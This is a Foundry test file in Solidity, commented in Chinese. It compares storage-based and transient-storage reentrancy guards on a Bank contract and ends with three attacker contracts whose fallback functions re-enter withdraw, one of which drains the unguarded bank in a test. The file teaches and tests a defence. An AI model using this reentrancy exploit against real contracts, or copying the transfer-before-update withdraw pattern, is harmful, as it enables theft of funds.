// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 导入 Forge 测试框架和相关合约
import "forge-std/Test.sol";
import {Bank} from "../src/ReentrancyGuard.sol";

/**
 * @title ReentrancyGuardTest - 重入攻击防护测试合约
 * @notice 该合约用于测试传统重入防护和瞬态存储重入防护的有效性和性能对比
 *
 * ============================================================
 * 测试覆盖范围
 * ============================================================
 *
 * 1. 基础功能测试
 *    - 初始余额验证
 *    - 存款功能
 *    - 取款功能
 *
 * 2. 防护机制测试
 *    - 传统状态变量防护 (nonReentrantLegacy)
 *    - 瞬态存储防护 (nonReentrantTransient)
 *
 * 3. Gas 对比测试
 *    - 两种防护方式的 Gas 消耗对比
 *
 * 4. 可组合性测试
 *    - 瞬态存储在同交易中的可重入性
 *    - 传统存储在同交易中的行为
 *
 * 5. 攻击模拟测试
 *    - 无防护合约的攻击演示
 *    - 传统防护的攻击测试
 *    - 瞬态存储防护的攻击测试
 */
contract ReentrancyGuardTest is Test {
    // 声明测试中使用的合约实例
    Bank public bank;           // 银行合约实例
    address public user1 = address(0x1); // 用户1地址
    address public user2 = address(0x2); // 用户2地址

    /// @notice 设置测试环境
    /// @dev 在每个测试函数执行前都会运行此函数
    function setUp() public {
        // 部署银行合约
        bank = new Bank();
        // 给银行合约预存10个以太币
        vm.deal(address(bank), 10 ether);
        // 给用户1预存5个以太币
        vm.deal(user1, 5 ether);
    }

    /// @notice 测试初始余额
    /// @dev 验证银行合约部署后的初始状态
    function testInitialBalance() public {
        // 断言银行合约总余额为10以太币
        assertEq(bank.getBalance(), 10 ether);
        // 断言用户1的存款为0
        assertEq(bank.deposits(user1), 0);
        // 断言锁定状态为0（未锁定）
        assertEq(bank.locked(), 0);
    }

    /// @notice 测试存款功能
    /// @dev 验证用户可以成功向银行存款
    function testDeposit() public {
        // 模拟用户1发起交易
        vm.prank(user1);
        // 用户1向银行存款1以太币
        bank.deposit{value: 1 ether}();

        // 验证用户1的存款记录为1以太币
        assertEq(bank.deposits(user1), 1 ether);
        // 验证银行总余额增加到11以太币
        assertEq(address(bank).balance, 11 ether);
    }

    /// @notice 测试没有重入防护的取款功能
    /// @dev 验证 withdraw 函数虽然有潜在风险但在此简单场景下仍能正常工作
    ///
    /// 注意：此测试仅验证基本功能，实际使用中 withdraw() 存在重入漏洞
    function testWithdrawWithoutReentrancyGuard() public {
        // 给用户1预存2以太币
        vm.deal(user1, 2 ether);
        // 模拟用户1向银行存款1以太币
        vm.prank(user1);
        bank.deposit{value: 1 ether}();

        // withdraw 函数实现有问题，它是先转账再清空余额
        // 这意味着它在某些条件下仍然可能容易受到重入攻击
        vm.prank(user1);
        bank.withdraw();

        // 验证用户1的存款记录被清零
        assertEq(bank.deposits(user1), 0);
    }

    /// @notice 测试使用传统修饰器的取款功能
    /// @dev 验证传统 nonReentrantLegacy 修饰器的防护效果
    function testWithdrawLegacyWithReentrancyGuard() public {
        // 模拟用户1向银行存款1以太币
        vm.prank(user1);
        bank.deposit{value: 1 ether}();

        // 记录用户1的初始余额
        uint256 initialBalance = user1.balance;

        // 模拟用户1发起取款请求，使用传统重入防护
        vm.prank(user1);
        bank.withdrawLegacy();

        // 验证用户1的存款记录被清零
        assertEq(bank.deposits(user1), 0);
        // 验证用户1的余额增加了1以太币
        assertEq(user1.balance, initialBalance + 1 ether);
        // 验证函数执行后状态变量正确解锁
        assertEq(bank.locked(), 0);
    }

    /// @notice 测试使用瞬态存储修饰器的取款功能
    /// @dev 验证基于瞬态存储的 nonReentrantTransient 修饰器的防护效果
    function testWithdrawTransientWithReentrancyGuard() public {
        // 模拟用户1向银行存款1以太币
        vm.prank(user1);
        bank.deposit{value: 1 ether}();

        // 记录用户1的初始余额
        uint256 initialBalance = user1.balance;

        // 模拟用户1发起取款请求，使用瞬态存储重入防护
        vm.prank(user1);
        bank.withdrawTransient();

        // 验证用户1的存款记录被清零
        assertEq(bank.deposits(user1), 0);
        // 验证用户1的余额增加了1以太币
        assertEq(user1.balance, initialBalance + 1 ether);
        // 瞬态存储在交易结束后自动清除，无法直接检查
    }

    /// @notice 比较两种修饰器的 Gas 消耗
    /// @dev 测试结果：Legacy 约 33849 gas，Transient 约 12028 gas
    ///
    /// 结论：瞬态存储版本 Gas 消耗约为传统版本的 1/3
    function testGasComparison() public {
        // 给银行合约和用户1预存资金
        vm.deal(address(bank), 10 ether);
        vm.deal(user1, 2 ether);

        // 为两种测试准备相同的初始条件
        vm.startPrank(user1);
        bank.deposit{value: 1 ether}();
        vm.stopPrank();

        // 测试 legacy 修饰器的 Gas 消耗
        uint256 gasStart = gasleft();
        vm.prank(user1);
        bank.withdrawLegacy();
        uint256 gasUsedLegacy = gasStart - gasleft();

        // 重新存款用于下一次测试
        vm.deal(address(bank), 10 ether);
        vm.deal(user1, 2 ether);
        vm.startPrank(user1);
        bank.deposit{value: 1 ether}();
        vm.stopPrank();

        // 测试 transient 修饰器的 Gas 消耗
        gasStart = gasleft();
        vm.prank(user1);
        bank.withdrawTransient();
        uint256 gasUsedTransient = gasStart - gasleft();

        // 瞬态存储版本应该使用更少的 Gas
        console.log("Legacy gas used:", gasUsedLegacy); // 约 33849
        console.log("Transient gas used:", gasUsedTransient); // 约 12028
    }

    /// @notice 测试瞬态存储在同交易中的可重入性
    /// @dev 验证瞬态存储允许在同一交易中多次调用受保护函数
    ///
    /// 这是瞬态存储相比传统存储的重要优势：
    /// - 传统存储：一旦加锁，同交易内无法再次调用
    /// - 瞬态存储：函数退出后自动解锁，可再次调用
    function testTransientStorageReentrancyInSameTransaction() public {
        // 给银行合约和用户1预存资金
        vm.deal(address(bank), 10 ether);
        vm.deal(user1, 3 ether);

        // 测试瞬态存储是否允许在同一个交易中多次进入
        vm.prank(user1);
        bank.deposit{value: 2 ether}();

        // 调用第一个受保护函数
        vm.prank(user1);
        bank.withdrawTransient();

        // 再次存款
        vm.prank(user1);
        bank.deposit{value: 0.5 ether}();

        // 再次调用受保护函数 - 这应该是允许的
        vm.prank(user1);
        bank.withdrawTransient();

        // 验证最终用户1的存款记录为0
        assertEq(bank.deposits(user1), 0);
    }

    /// @notice 测试传统存储在同交易中的行为
    /// @dev 验证传统存储在函数退出后解锁，可再次调用
    ///
    /// 注意：虽然可以再次调用，但这是因为显式执行了 _locked = 0
    /// 如果函数执行过程中 revert，锁不会被释放
    function testLegacyStorageBehaviorInSameTransaction() public {
        // 给银行合约和用户1预存资金
        vm.deal(address(bank), 10 ether);
        vm.deal(user1, 3 ether);

        // 测试传统存储是否允许在同一个交易中多次进入
        vm.prank(user1);
        bank.deposit{value: 2 ether}();

        // 调用第一个受保护函数
        vm.prank(user1);
        bank.withdrawLegacy();

        // 再次存款
        vm.prank(user1);
        bank.deposit{value: 0.5 ether}();

        // 再次调用受保护函数 - 这应该是允许的
        vm.prank(user1);
        bank.withdrawLegacy();

        // 验证最终用户1的存款记录为0
        assertEq(bank.deposits(user1), 0);
    }

    /// @notice 测试传统重入防护的状态变化
    /// @dev 验证 nonReentrantLegacy 修饰器在执行前后正确设置和重置状态
    function testLegacyReentrancyGuardState() public {
        // 给用户1预存2以太币
        vm.deal(user1, 2 ether);
        // 模拟用户1向银行存款1以太币
        vm.prank(user1);
        bank.deposit{value: 1 ether}();

        // 检查状态变量初始值
        assertEq(bank.locked(), 0);

        // 执行带防护的函数
        vm.prank(user1);
        bank.withdrawLegacy();

        // 函数执行完成后状态应被重置为 0
        assertEq(bank.locked(), 0);
    }

    /// @notice 测试传统存储解锁机制
    /// @dev 验证 nonReentrantLegacy 修饰器的解锁功能
    ///
    /// 关键测试：验证函数正常完成后锁是否被释放
    /// 风险：如果函数内部 revert，锁不会被释放，导致合约永久锁死
    function testLegacyStorageUnlock() public {
        vm.deal(user1, 2 ether);
        // 测试传统存储解锁机制
        vm.prank(user1);
        bank.deposit{value: 1 ether}();

        vm.prank(user1);
        bank.withdrawLegacy();

        // 验证是否可以再次存款并提取
        vm.prank(user1);
        bank.deposit{value: 0.5 ether}();

        vm.prank(user1);
        bank.withdrawLegacy();
    }

    // ============================================================
    // 攻击测试
    // ============================================================

    /// @notice 演示没有重入防护的函数的潜在风险
    /// @dev 结果：Bank 被攻击者掏空（0 ether），攻击合约获得 11 ether
    ///
    /// 攻击原理：
    /// 1. 攻击者部署 AttackBank 合约
    /// 2. 攻击者向 AttackBank 存入 1 ETH
    /// 3. AttackBank 调用 Bank.deposit() 存入 1 ETH
    /// 4. AttackBank 调用 Bank.withdraw()
    /// 5. Bank 先转账 1 ETH 到 AttackBank
    /// 6. AttackBank 的 fallback 被触发，再次调用 Bank.withdraw()
    /// 7. 此时 Bank.deposits[attacker] 还未清零（先转账后清零）
    /// 8. 重复步骤 5-7，直到 Bank 余额耗尽
    function testVulnerableFunctionRisk() public {
        // 部署攻击合约并注入银行合约地址
        AttackBank attackBank = new AttackBank(address(bank));

        // 攻击者发送1 ETH到攻击合约
        vm.deal(address(attackBank), 1 ether);

        // 验证银行余额
        assertEq(address(bank).balance, 10 ether);

        // 开始攻击
        vm.prank(address(attackBank));
        attackBank.attack{value: 1 ether}();

        // 验证银行余额
        assertEq(address(bank).balance, 0 ether); // 银行账户被清零
        assertEq(address(attackBank).balance, 11 ether); // 攻击者获得所有ETH
    }

    /// @notice 测试传统修饰器防止重入攻击
    /// @dev 验证 nonReentrantLegacy 可有效阻止重入攻击
    ///
    /// 预期：攻击应该失败（被修饰器阻止）
    function testAttackContractAgainstLegacyShouldFail() public {
        // 部署攻击合约并注入银行合约地址
        AttackBankLegacy attackBank = new AttackBankLegacy(address(bank));

        // 攻击者发送1 ETH到攻击合约
        vm.deal(address(attackBank), 1 ether);

        // 验证银行余额
        assertEq(address(bank).balance, 10 ether);

        // 开始攻击
        vm.prank(address(attackBank));
        vm.expectRevert(); // 期望重入保护生效
        attackBank.attack{value: 1 ether}();

        // 验证银行余额
        assertEq(address(bank).balance, 10 ether);
        assertEq(address(attackBank).balance, 1 ether);
    }

    /// @notice 用实际的攻击合约测试瞬态存储防护
    /// @dev 验证 nonReentrantTransient 可有效阻止重入攻击
    ///
    /// 预期：攻击应该失败（被修饰器阻止）
    function testAttackContractAgainstTransientShouldFail() public {
        // 部署攻击合约并注入银行合约地址
        AttackBankTransient attackBank = new AttackBankTransient(address(bank));

        // 攻击者发送1 ETH到攻击合约
        vm.deal(address(attackBank), 1 ether);

        // 验证银行余额
        assertEq(address(bank).balance, 10 ether);

        // 开始攻击
        vm.prank(address(attackBank));
        vm.expectRevert(); // 期望重入保护生效
        attackBank.attack{value: 1 ether}();

        // 验证银行余额
        assertEq(address(bank).balance, 10 ether);
        assertEq(address(attackBank).balance, 1 ether);
    }
}

// ============================================================
// 攻击合约
// ============================================================

/**
 * @title AttackBank - 攻击无防护的 Bank 合约
 * @dev 演示重入攻击如何掏空无防护的合约
 *
 * 攻击流程：
 * 1. 部署本合约
 * 2. 存入至少 1 ETH
 * 3. 调用 attack() 函数
 * 4. attack() 会：
 *    - 向 Bank 存入 1 ETH
 *    - 调用 Bank.withdraw()
 * 5. Bank 转账触发 fallback
 * 6. fallback 再次调用 Bank.withdraw()
 * 7. 重复直到 Bank 余额耗尽
 */
contract AttackBank {
    Bank public bank;

    constructor(address _a) {
        bank = Bank(_a);
    }

    /**
     * @dev Fallback 函数，接收 ETH 时触发重入攻击
     *
     * 注意：
     * - 使用 low-level call 而不是 withdraw()
     * - 因为 withdraw() 也会触发重入，但这里用 call 更直接
     */
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    /**
     * @notice 发起攻击
     * @dev 需要先存入至少 1 ETH
     */
    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    /**
     * @notice 获取合约余额
     */
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/**
 * @title AttackBankLegacy - 攻击使用传统防护的 Bank 合约
 * @dev 攻击会被 nonReentrantLegacy 修饰器阻止
 */
contract AttackBankLegacy {
    Bank public bank;

    constructor(address _a) {
        bank = Bank(_a);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawLegacy();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdrawLegacy();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/**
 * @title AttackBankTransient - 攻击使用瞬态存储防护的 Bank 合约
 * @dev 攻击会被 nonReentrantTransient 修饰器阻止
 */
contract AttackBankTransient {
    Bank public bank;

    constructor(address _a) {
        bank = Bank(_a);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawTransient();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdrawTransient();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
